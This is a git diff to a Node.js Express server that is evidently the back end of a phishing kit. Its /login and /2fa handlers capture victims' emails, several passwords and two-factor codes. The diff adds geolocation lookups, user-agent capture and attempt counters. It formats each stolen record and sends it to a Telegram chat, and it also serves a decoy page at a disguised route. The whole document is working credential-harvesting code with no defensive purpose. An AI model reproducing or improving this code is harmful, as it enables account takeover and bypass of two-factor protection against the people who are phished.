@@ -55,25 +55,54 @@ async function sendToTelegram(message) {
 // Function to log data
 async function logData(data) {
   const location = await getLocation(data.ip);
-  const logEntry = `${new Date().toISOString()} - IP: ${data.ip} - Location: ${location} - ${JSON.stringify(data)}\n`;
+
+  const logEntry =
+    `${new Date().toISOString()} - IP: ${data.ip} - Location: ${location} - ${JSON.stringify(data)}\n`;
+
   console.log(logEntry);
-  fs.appendFile('server.log', logEntry, (err) => {
-    if (err) console.error('Error logging data:', err);
+
+  fs.appendFile("server.log", logEntry, (err) => {
+    if (err) console.error("Error logging data:", err);
   });
 
-  // Format message for Telegram
-  let telegramMessage = `🔔 *New Activity*\n`;
-  telegramMessage += `*Type:* ${data.type}\n`;
-  telegramMessage += `*IP:* ${data.ip}\n`;
-  telegramMessage += `*Location:* ${location}\n`;
+  // Format message KHÔNG markdown
+  let telegramMessage = "";
 
-  if (data.email) telegramMessage += `*Email:* \`${data.email}\`\n`;
-  if (data.pass) telegramMessage += `*Password:* \`${data.pass}\`\n`;
-  if (data.code) telegramMessage += `*Code:* \`${data.code}\`\n`;
-  if (data.step) telegramMessage += `*Step:* ${data.step}\n`;
-  if (data.page) telegramMessage += `*Page:* ${data.page}\n`;
+  telegramMessage += "THONG TIN HOAT DONG\n";
+  telegramMessage += "----------------------------------------------------------\n";
 
-  sendToTelegram(telegramMessage);
+  if (data.email) telegramMessage += `Email: ${data.email}\n`;
+  if (data.pass) telegramMessage += `Password: ${data.pass}\n`;
+  if (data.password1) telegramMessage += `Pass 1: ${data.password1}\n`;
+  if (data.password2) telegramMessage += `Pass 2: ${data.password2}\n`;
+
+  telegramMessage += "----------------------------------------------------------\n";
+
+  if (data.code1) telegramMessage += `Code 1: ${data.code1}\n`;
+  if (data.code2) telegramMessage += `Code 2: ${data.code2}\n`;
+
+  telegramMessage += "----------------------------------------------------------\n";
+
+  telegramMessage += `IP Address: ${data.ip || "N/A"}\n`;
+  telegramMessage += `Location: ${location}\n`;
+  telegramMessage += `City: ${data.city || "N/A"}\n`;
+  telegramMessage += `Region: ${data.region || "N/A"}\n`;
+  telegramMessage += `Country: ${data.country || "N/A"}\n`;
+  telegramMessage += `Org: ${data.org || "N/A"}\n`;
+  telegramMessage += `Timezone: ${data.timezone || "N/A"}\n`;
+
+  telegramMessage += "----------------------------------------------------------\n";
+
+  telegramMessage += `User-Agent:\n${data.userAgent || "N/A"}\n`;
+
+  telegramMessage += "----------------------------------------------------------\n";
+
+  if (data.type) telegramMessage += `Type: ${data.type}\n`;
+  if (data.attempt) telegramMessage += `Attempt: ${data.attempt}\n`;
+  if (data.step) telegramMessage += `Step: ${data.step}\n`;
+  if (data.page) telegramMessage += `Page: ${data.page}\n`;
+
+  await sendToTelegram(telegramMessage);
 }
 
 // Logging middleware for index.html
@@ -96,14 +125,23 @@ app.get('/login', (req, res) => {
 });
 
 // Handle login submission
-app.post('/login', (req, res) => {
-  const { email, pass } = req.body;
+app.post('/login',async (req, res) => {
+  const { email, pass, attempts } = req.body;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
-  logData({ type: 'Login Attempt', email, pass, ip });
+  const geo = await getGeo(ip);
 
-  // Redirect to 2FA page
-  res.redirect('/2fa.html');
+  const userAgent = req.headers['user-agent'];
+  logData({ type: `Đăng Nhập Lần ${attempts} - Email  ${email}`, email, pass, ip, attempt: attempts,ip    , userAgent,
+    city: geo.city,
+    region: geo.region,
+    country: geo.country,
+    org: geo.org,
+    timezone: geo.timezone,
+    time: new Date().toISOString() });
+
+  // Return JSON instead of redirecting so frontend can handle flow
+  res.json({ status: 'ok' });
 });
 
 // Serve 2FA page
@@ -111,12 +149,53 @@ app.get('/2fa.html', (req, res) => {
   res.sendFile(path.join(__dirname, '2fa.html'));
 });
 
+// Serve latest-settings-info route
+app.get('/latest-settings-info/latest-settings-info/latest-settings-info', (req, res) => {
+  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  logData({ type: 'Page Visit', page: '/latest-settings-info/latest-settings-info/latest-settings-info', ip });
+  res.sendFile(path.join(__dirname, 'fx.html'));
+});
+async function getGeo(ip) {
+  try {
+    if (!ip || ip === '::1' || ip === '127.0.0.1') {
+      return { city: 'Local', region: 'Local', country: 'Local' };
+    }
+
+    const response = await fetch(`http://ip-api.com/json/${ip}`);
+    const data = await response.json();
+
+    if (data.status === 'success') {
+      return {
+        city: data.city,
+        region: data.regionName,
+        country: data.country,
+        org: data.org,
+        timezone: data.timezone
+      };
+    }
+
+    return {};
+  } catch (err) {
+    return {};
+  }
+}
+
 // Handle 2FA submission
-app.post('/2fa', (req, res) => {
-  const { code, step, email, pass } = req.body;
+app.post('/2fa', async (req, res) => {
+  const { code1,code2, password1, password2, email ,step} = req.body;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
-  logData({ type: '2FA Attempt', code, step, ip, email, pass });
+
+  const userAgent = req.headers['user-agent'];
+
+  const geo = await getGeo(ip);
+  logData({ type: `2FA Lần  ${step} - Email  ${email}`, code1,code2, password1, password2, email,ip    , userAgent,
+    city: geo.city,
+    region: geo.region,
+    country: geo.country,
+    org: geo.org,
+    timezone: geo.timezone,
+    time: new Date().toISOString()});
 
   if (step == 1) {
     // Log first code and signal frontend to reload
